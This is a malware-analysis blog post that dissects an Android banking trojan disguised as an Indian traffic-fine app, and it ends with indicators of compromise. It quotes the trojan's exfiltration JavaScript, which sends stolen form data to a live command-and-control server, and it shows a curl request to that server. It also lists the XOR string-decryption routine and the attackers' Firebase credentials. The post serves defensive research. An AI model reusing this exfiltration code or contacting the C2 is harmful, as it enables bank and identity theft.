---
title: "Dissecting a Two-Stage Indian Banking Trojan: From Fake eChallan to Full Device Compromise"
date: 2026-02-19T21:00:00+05:30
lastmod: 2026-02-19T21:00:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/rto-malware-analysis/06_p3_card_details.png
  alt: "cover image"
simg: /img/rto-malware-analysis/00_dropper_launch.png

categories:
  - Android
  - Malware Analysis

tags:
  - android
  - malware
  - banking-trojan
  - frida
  - reverse-engineering
  - phishing
  - firebase

draft: false
description: "Deep-dive analysis of a fresh Android banking trojan disguised as an Indian RTO eChallan app. Two-stage dropper + payload architecture using NP Protect packer, Firebase C2, SMS interception, USSD abuse, and a 7-page phishing funnel stealing Aadhaar, PAN, card details, and UPI PINs. Only 11/66 VirusTotal detection rate."
---

## TL;DR

We obtained a fresh Android malware sample masquerading as an Indian RTO (Road Transport Office) traffic fine payment app. Our analysis revealed a sophisticated two-stage banking trojan with:

- A **dropper** protected by NP Protect commercial packer (v3.1.37) that silently installs a hidden payload
- A **payload** capable of real-time SMS interception, USSD banking code execution, and a 7-page phishing funnel stealing Aadhaar, PAN, card details, and UPI PINs
- **Firebase Cloud Messaging** as a C2 channel and an active HTTP C2 at `jsonserv[.]live`
- **Only 11/66 VirusTotal detections** (16.7% detection rate) -- most major AV engines miss it entirely

---

## 1. Initial Triage

The sample arrived as `RTO Traffic Challan 1000 (1).apk` -- a 10MB APK posing as an Indian traffic fine payment application. Quick triage immediately raised flags:

```
Package:    com.odczyy.android
Version:    9.4.0
Size:       10,042,733 bytes
MD5:        c3c1f03adeaf5b478441844f58eb9970
SHA-256:    7d22cccddf2e9ca2f86fdd79c6f7d201849d4f2c3890da5ed2b50a20f62d062e
```

The APK's ZIP structure was deliberately corrupted -- 862 entries with invalid compression methods (14565/6998), fake CRC32 values, and fabricated file sizes. This anti-analysis technique prevents repackaging tools like `apktool` from reassembling the APK, blocking Frida Gadget injection and other tampering approaches.

**VirusTotal Status**: A patched variant ([VT link](https://www.virustotal.com/gui/file/a38d551f16666d1c09a5b1d0b52c608b3f8a9957f32159170695e1be9a491ca4)) scores **11/66** -- only 16.7% detection rate. The popular threat label is `banker.bankbot/ftux`. Our original unpatched dropper hash returns "Not found" on VT entirely.

| AV Engine | Detection Name |
|---|---|
| AhnLab-V3 | Trojan/Android.Banker.1222770 |
| Avira | ANDROID/Bankbot.FTUX.Gen |
| BitDefenderFalx | Android.Riskware.Packer.BZ |
| Cynet | Malicious (score: 99) |
| DrWeb | Android.Packed.NP.1 |
| Fortinet | Android/Agent.JDU!tr |
| Ikarus | Trojan-Spy.AndroidOS.Banker |
| Kaspersky | HEUR:Trojan-Banker.AndroidOS.Rewardsteal.rj |
| QuickHeal | Android.BankerSCF.AT |
| Sophos | Android Obfuscated APK (PUA) |
| WithSecure | Malware.ANDROID/Bankbot.FTUX.Gen |

*Notable: DrWeb correctly identifies the NP Protect packer (`Android.Packed.NP.1`), Kaspersky classifies it in the Rewardsteal family, and major engines like Avast, AVG, ESET, McAfee, and Microsoft all miss it entirely.*

---

## 2. The Dropper: NP Protect Packer

Running the dropper on our test device reveals a fake "Update Available" screen -- a common social engineering pattern that tricks users into believing they need to install an "update" (which is actually the malicious payload).

![img](/img/rto-malware-analysis/00_dropper_launch.png)

*The dropper presents a convincing fake update screen listing "Performance improvements", "Bug fixes", "Security updates" -- all designed to make the victim tap "INSTALL UPDATE".*

### Packer Identification

The APK is protected by **NP Protect**, a commercial Chinese Android packer. We identified the exact version from metadata files inside the APK:

```
ProtectTime: 2026-02-16 17:39:59
Function: Control Flow Confusion 8.0
Version: 3.1.37
```

The packer applies six layers of anti-tampering, making it impossible to repackage the APK with tools like `apktool` or inject Frida Gadget statically.

### Payload Delivery Mechanism

After the user taps "INSTALL UPDATE", the dropper decrypts and silently installs a second APK. Examining the dropper's data directory on a rooted device reveals a fascinating storage scheme:

```
/data/data/com.odczyy.android/dir1/dir2/.../dir9/
    payload      (5,110,861 bytes - the encrypted payload APK)
    payload.meta (8 bytes - metadata/key)
```

**Nine nested directories**, all named with the same Arabic Unicode characters. This Unicode obfuscation makes the path extremely difficult to navigate or analyze with standard tools. The payload file at the bottom is a valid ZIP/APK with Unicode-mangled internal filenames.

The 8-byte metadata file contains `0000019c65d3b327` -- likely a version marker or decryption key.

---

## 3. The Payload: Anatomy of a Banking Trojan

We pulled the installed payload directly from the device:

```bash
adb pull "/data/app/~~bZbkisj76N_-ZNOEp2sdOw==/\
com.sumitkkgghbbk.android-1UwbzNNx1Rck3wxjhiLydA==/base.apk"
```

```
Package:    com.sumitkkgghbbk.android
Version:    10.0 (versionCode: 100)
Min SDK:    26 (Android 8.0)
Target SDK: 36
MD5:        8fc953661130b9c5c2f366322efca6c5
SHA-256:    bde4244916d5d4e0e990b0b737efbbce4d18b608ca428c3f37d1dacb3210c5c2
Classes:    1,940
Framework:  Capacitor (Ionic) + Next.js
```

### 3.1 Permissions -- The Red Flags

The manifest requests a telling combination of permissions:

| Permission | Abuse Purpose |
|---|---|
| `READ_SMS` / `RECEIVE_SMS` / `SEND_SMS` | Full SMS control -- intercept OTPs, read inbox, send on victim's behalf |
| `CALL_PHONE` | Silent phone calls, USSD code execution |
| `READ_PHONE_STATE` | Device/SIM fingerprinting |
| `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` | Survive OS cleanup -- persistence |
| `POST_NOTIFICATIONS` | Display fake notification lures |

### 3.2 Stealth: Hidden from Launcher

A critical detail in the manifest -- the main activity uses `android.intent.category.INFO` instead of `android.intent.category.LAUNCHER`:

```xml
<activity android:name=".MainActivity"
          android:exported="true"
          android:launchMode="2">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.INFO"/>
    </intent-filter>
</activity>
```

This means the app **does not appear in the app drawer**. After installation, there is no icon for the user to find or remove. The app is effectively invisible.

### 3.3 Key Components

| Component | Class | Role |
|---|---|---|
| **MainActivity** | `.MainActivity` | WebView hosting phishing pages via Capacitor |
| **Verifier** | `.Verifier` | BroadcastReceiver -- real-time SMS interception |
| **Notifier** | `.Notifier` | FirebaseMessagingService -- C2 command handler |

---

## 4. The Phishing Funnel: 7 Pages of Credential Theft

The payload uses the Capacitor framework to load locally-bundled phishing pages in a WebView. The pages are built with Next.js and walk the victim through a carefully designed credential harvesting flow.

### Page 1: Personal Information

![img](/img/rto-malware-analysis/01_payload_main_screen.png)

*The first page collects Full Name, Mobile Number, Mother's Name, and Date of Birth -- all commonly used as security questions by Indian banks.*

### Page 2: National ID Documents

![img](/img/rto-malware-analysis/04_p1_aadhaar_pan.png)

*Aadhaar Number (India's 12-digit biometric ID) and PAN Card Number (tax ID) -- the two most critical identity documents in India. With these, an attacker can open bank accounts, take loans, or perform SIM swaps.*

### Page 3: The Bait -- Challan Fee

![img](/img/rto-malware-analysis/05_p2_challan_fees.png)

*"Challan Fees -- Amount: Rs.1". The trivially small amount is the social engineering hook -- a Rs.1 fee seems harmless, encouraging the victim to proceed through the payment flow without suspicion. This is the bridge between identity theft and financial credential theft.*

### Page 4: Banking Card Details

![img](/img/rto-malware-analysis/06_p3_card_details.png)

*Card Number, Expiry, CVV, and ATM PIN. Note the "Select Payment Method" buttons offering Debit/Credit Card, Net Banking, and UPI -- mimicking a real payment gateway. No legitimate payment processor ever asks for an ATM PIN.*

### Page 5: Net Banking / Transaction Password

![img](/img/rto-malware-analysis/07_p4_net_banking.png)

*If the victim selects Net Banking, they're prompted for their "Transaction Password/Profile Password" -- the credentials used for online banking portals. The vague "two-step verification password" phrasing targets users of multiple banks.*

### Page 6: UPI PIN

![img](/img/rto-malware-analysis/08_p5_upi_pin.png)

*A fake UPI payment interface showing "Sending Rs.1 to RTO eChallan" with a custom on-screen numeric keypad for entering the UPI PIN. The custom keypad bypasses any system-level input protection. The warning "You are transferring money from your account to RTO eChallan" adds false legitimacy.*

### Page 7: Stall Tactic

![img](/img/rto-malware-analysis/09_success_stall.png)

*After stealing everything, the victim sees "Thank You! Verification may take up to 24 hours." This buys the attacker time to drain accounts before the victim realizes something is wrong.*

### Data Exfiltration

The JavaScript in the phishing pages reveals the exfiltration mechanism:

```javascript
// Base64-encoded C2 URL decoded at runtime
let url = window.atob("aHR0cHM6Ly9qc29uc2Vydi5saXZlL2FwcC1zdG9yZQ==");
// Decodes to: https://jsonserv[.]live/app-store

let response = await fetch(
    `${url}?id=${packageInfo.id}&android_id=${deviceId}`,
    {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: Buffer.from(JSON.stringify(formData)).toString("base64")
    }
);
```

Form data is collected, serialized to JSON, Base64-encoded, and POSTed to the C2 server with the device's Android ID and package name as query parameters.

---

## 5. C2 Infrastructure

### Firebase Cloud Messaging (Primary C2)

The payload registers with Firebase immediately on launch. We captured the registration via Frida hooks:

```
[NET] URL.openConnection: https://firebaseinstallations.googleapis.com/
      v1/projects/sumit-6776c/installations

[JSON] put: fid = cJijxrKpRcuon-16NCc0nL
[JSON] put: appId = 1:700597954795:android:abbd0a56b31df3671fb6ae
[JSON] put: sdkVersion = a:18.0.0
```

Firebase credentials extracted from `strings.xml`:

| Credential | Value |
|---|---|
| Project ID | `sumit-6776c` |
| GCM Sender ID | `700597954795` |
| API Key | `AIzaSyBkVAbPGhtdkky0P7wSs2Y_-MAfinZwfoA` |
| App ID | `1:700597954795:android:abbd0a56b31df3671fb6ae` |
| Storage Bucket | `sumit-6776c.firebasestorage.app` |

The FCM channel is bidirectional -- push notifications deliver commands to the `Notifier` service, and results are sent back through Firebase.

### HTTP C2 Endpoint

```
Domain:     jsonserv[.]live
URL:        https://jsonserv[.]live/app-store
IPs:        104.21.71.10, 172.67.168.248 (Cloudflare)
NS:         alina.ns.cloudflare.com, damon.ns.cloudflare.com
Server:     LiteSpeed Web Server
Status:     ACTIVE
```

We confirmed the C2 is live by sending a test POST:

```bash
$ curl -X POST 'https://jsonserv[.]live/app-store?id=test&android_id=test' \
       -H 'Content-Type: text/plain' -d 'dGVzdA=='

{"s":false,"message":"not data recived"}
```

The server responded -- it's active and expecting Base64-encoded data. The typo "recived" in the response suggests non-native English development.

### Attacker Attribution Hint

Frida hooks captured the Capacitor configuration at runtime:

```json
{
    "appId": "com.mithleshj.android",
    "appName": "RTO eChallan",
    "webDir": "out"
}
```

The internal Capacitor `appId` is `com.mithleshj.android` -- different from the obfuscated package name. The name "mithleshj" appears to be the developer's identifier. The Firebase project name `sumit-6776c` contains another name -- "sumit".

---

## 6. SMS Interception & USSD Abuse

### Real-Time SMS Interception

The `Verifier` class registers as a BroadcastReceiver for both `SMS_RECEIVED` and `SMS_DELIVER` -- the latter gives it exclusive first access to incoming SMS if it becomes the default SMS handler.

The call chain through the heavily obfuscated code:

```
Verifier.onReceive()
  -> m326(context, intent)
    -> h.b(context, intent)
      -> h.m360()
        -> h.c()
          -> C0065.m144(intent, context)   // Parse SMS PDUs
            -> SmsMessage.createFromPdu()
            -> SmsMessage.getMessageBody()
            -> SmsMessage.getOriginatingAddress()
```

Every incoming SMS -- including bank OTPs -- is intercepted, parsed, and forwarded to the C2.

### FCM C2 Command Handlers

The `Notifier` class (~4,270 lines) contains 8 inner classes implementing C2 commands. We decrypted the XOR-encrypted command strings:

| Command | Inner Class | Function |
|---|---|---|
| `action` | Dispatcher | FCM command field name (XOR key: 1437) |
| `send` | `Notifier.a` | Send SMS from victim's device (XOR key: 669) |
| `ussd` | `Notifier.a` | Execute USSD banking codes (XOR key: 1660) |
| `read` | `Notifier.b` | Dump entire SMS inbox via `content://sms/inbox` |

### USSD Execution -- The Most Dangerous Capability

The malware can execute arbitrary USSD codes via `TelephonyManager.sendUssdRequest()`. In India, USSD codes are widely used for mobile banking:

- `*99#` -- USSD-based mobile banking (NUUP)
- `*XXX*amount*MPIN#` -- Fund transfers via various banks

The `UssdResponseCallback` inner class reports results back to C2:

```
Decoded string (XOR key 1079): "USSD"      -> success response tag
Decoded string (XOR key 2377): "USSD FAIL" -> failure response tag
```

The malware supports multi-SIM devices via `SubscriptionManager`, allowing it to target specific SIM slots.

---

## 7. String Encryption: Breaking NP Protect's XOR Scheme

Every string in the malware is encrypted using XOR on `short[]` arrays. The encryption utility implements:

```java
// m411(short[] sArr, int offset, int length, int xorKey)
char[] result = new char[length];
for (int i = 0; i < length; i++) {
    result[i] = (char)(sArr[offset + i] ^ xorKey);
}
return new String(result);
```

Each class contains its own `static final short[]` array, and different call sites use different XOR keys. We wrote a script to brute-force these, revealing critical strings:

| Encrypted Array | XOR Key | Decrypted String |
|---|---|---|
| `Notifier.f59short` | 2376 | `No sms found` |
| `Notifier.f59short` | 1437 | `action` |
| `Notifier.b.f61short` | 951 | `Y29udGVudDovL3Ntcy9pbmJveA==` |
| `Notifier.f.f64short` | 2256 | `body` |
| `Notifier.f.f64short` | 2432 | `ADDRESS` |
| `Notifier.h.f66short` | 2134 | `CALL_PHONE permission not granted` |
| `Notifier.f73short` | 2730 | `android.permission.READ_PHONE_STATE` |

The Base64 string decodes to `content://sms/inbox` -- the SMS content provider URI. This is a double encoding scheme: XOR encryption wrapping Base64, providing two layers of obfuscation.

### Control Flow Obfuscation

Every method is transformed into a state machine:

```java
int state = SomeClass.computeState("...");
while (true) {
    switch (state) {
        case 1747651: /* opaque predicate */ break;
        case 1748828: h.b((Context) obj, (Intent) obj2); /* real logic */ break;
        case 1749669: /* more opaque predicates */ break;
        // ...
    }
    return;
}
```

The state values are computed using arithmetic on dozens of static fields spread across hundreds of obfuscation helper classes. JADX frequently fails to decompile these methods, outputting raw Dalvik bytecode instead.

---

## 8. Dynamic Analysis with Frida

After creating a rooted Android 14 AVD (google_apis, arm64-v8a), we deployed Frida server and wrote custom hooks to monitor the malware's runtime behavior.

### SSL Bypass + Malware Monitoring

```bash
frida -D emulator-5554 -f com.sumitkkgghbbk.android \
    -l ssl-bypass.js \
    -l malware-hooks.js \
    -l deep-hooks.js
```

Key runtime observations:

1. **Immediate Firebase registration** to project `sumit-6776c`
2. **WebView loads `https://localhost`** -- the local Capacitor server serving phishing pages
3. **JWT auth token issued** with 7-day expiry (604800 seconds)
4. **Capacitor plugins registered** including custom `AndroidIdPlugin` for device fingerprinting
5. **SharedPrefs written**: `lastBinaryVersionCode=100`, `lastBinaryVersionName=10.0`

### Registered Capacitor Plugins

```
App              -> getInfo, getState, exitApp, minimizeApp
SystemBars       -> hide, show, setStyle
Dialog           -> alert, confirm, prompt
CapacitorCookies -> getCookies, setCookie, clearCookies
CapacitorHttp    -> GET, POST, PUT, DELETE, PATCH
WebView          -> setServerBasePath, getServerBasePath
AndroidIdPlugin  -> getAndroidId  <-- custom device fingerprinting
```

The `CapacitorHttp` plugin provides the native HTTP bridge for the phishing pages to exfiltrate data without WebView CORS restrictions.

---

## 9. Persistence Mechanisms

The malware employs multiple persistence techniques:

| Technique | Implementation |
|---|---|
| **Launcher hiding** | `category.INFO` instead of `LAUNCHER` -- no app icon visible |
| **Battery optimization bypass** | `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` -- survives Doze mode |
| **Default SMS handler** | Prompts to become default SMS app -- harder to remove, exclusive SMS access |
| **Wake lock** | `WAKE_LOCK` -- keeps device awake for C2 connectivity |
| **FCM-based wake** | Push notifications auto-wake the app even if killed |
| **singleTask launch** | `launchMode="2"` -- single instance, persists across task switches |
| **Direct boot aware** | `FirebaseInitProvider` with `directBootAware="true"` -- starts before unlock |

---

## 10. Indicators of Compromise

### File Hashes

| SHA-256 | Description |
|---|---|
| `7d22cccddf2e9ca2f86fdd79c6f7d201849d4f2c3890da5ed2b50a20f62d062e` | Dropper APK (original) |
| `a38d551f16666d1c09a5b1d0b52c608b3f8a9957f32159170695e1be9a491ca4` | Dropper APK (patched variant, [11/66 on VT](https://www.virustotal.com/gui/file/a38d551f16666d1c09a5b1d0b52c608b3f8a9957f32159170695e1be9a491ca4)) |
| `bde4244916d5d4e0e990b0b737efbbce4d18b608ca428c3f37d1dacb3210c5c2` | Payload APK (installed) |
| `724b1fb7b58a089967e1a583f6c5370e6da508fe3c475770063f01ca38b17730` | Cached payload (from dropper data dir) |

### Network IOCs

| Indicator | Type |
|---|---|
| `jsonserv[.]live` | C2 Domain (active, Cloudflare-fronted) |
| `https://jsonserv[.]live/app-store` | C2 Exfiltration URL |
| `104.21.71.10` | C2 IP (Cloudflare) |
| `172.67.168.248` | C2 IP (Cloudflare) |
| `sumit-6776c.firebasestorage.app` | Firebase Storage |

### Package Names

| Package | Role |
|---|---|
| `com.odczyy.android` | Dropper |
| `com.sumitkkgghbbk.android` | Payload |
| `com.mithleshj.android` | Attacker's development app ID |

### Firebase Credentials

| Indicator | Value |
|---|---|
| Project ID | `sumit-6776c` |
| Sender ID | `700597954795` |
| API Key | `AIzaSyBkVAbPGhtdkky0P7wSs2Y_-MAfinZwfoA` |
| App ID | `1:700597954795:android:abbd0a56b31df3671fb6ae` |

### Detection Signatures

```
# File system artifacts
assets/protected_by_np/ApkControlFlowConfusion_8.0_*.txt

# Component names
com.sumitkkgghbbk.android.Verifier
com.sumitkkgghbbk.android.Notifier
com.sumitkkgghbbk.android.Finger_3c0aeafd396e4989b01f4e2a3cf8a480

# Behavioral
Registers for SMS_DELIVER + SMS_RECEIVED with BROADCAST_SMS permission
Queries content://sms/inbox from non-messaging app
Uses TelephonyManager.sendUssdRequest()
category.INFO with MAIN action (launcher hiding)
```

### MITRE ATT&CK Mobile

| ID | Technique |
|---|---|
| T1660 | Phishing (multi-step credential overlay) |
| T1437.001 | Application Layer Protocol: Web (Firebase FCM + HTTP C2) |
| T1412 | Capture SMS Messages |
| T1582 | SMS Control (send/read/intercept) |
| T1406 | Obfuscated Files or Information (NP Protect + XOR) |
| T1628.001 | Hide Artifacts: Suppress Application Icon |
| T1624 | Event Triggered Execution (FCM push commands) |
| T1444 | Masquerade as Legitimate Application |

---

## 11. Conclusion

This sample demonstrates the increasing sophistication of India-targeting banking trojans:

1. **Commercial packer** (NP Protect) with control flow obfuscation making static analysis extremely difficult
2. **Two-stage delivery** where the dropper and payload are separate packages, with the payload hidden from the launcher
3. **Multi-channel C2** using both Firebase (for commands) and a custom HTTP endpoint (for data exfiltration)
4. **Comprehensive credential theft** covering identity documents (Aadhaar, PAN), banking credentials (card, CVV, ATM PIN), and payment systems (UPI PIN, transaction passwords)
5. **Full device control** via SMS interception, USSD execution, and phone call capabilities
6. **Low AV detection** (11/66 on VT) -- the commercial packer evades Avast, AVG, ESET, McAfee, Microsoft, and most other major engines

The "wait 24 hours for verification" stall tactic on the final page is particularly insidious -- it gives the attacker a full day window to drain accounts using the stolen credentials and intercepted OTPs before the victim suspects anything.

### Recommendations

- Block `jsonserv[.]live` at the DNS/network level
- Report Firebase project `sumit-6776c` to Google for abuse
- Indian users should only pay traffic fines through official government portals
- Enable two-factor authentication methods beyond SMS where possible
- Be suspicious of any app requesting SMS permissions alongside payment functionality

---

*Analysis performed using JADX, Frida 17.7.1, Android Emulator (API 34, rooted), Burp Suite, and adb.*